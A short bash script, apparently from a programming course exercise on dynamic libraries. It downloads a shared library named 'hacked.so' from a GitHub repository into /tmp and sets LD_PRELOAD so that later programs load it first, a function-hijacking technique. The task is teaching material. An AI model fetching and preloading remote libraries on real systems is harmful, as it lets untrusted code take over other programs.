#!/bin/bash
wget -P /tmp https://github.com/Tomeseen/alx-low_level_programming/tree/master/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
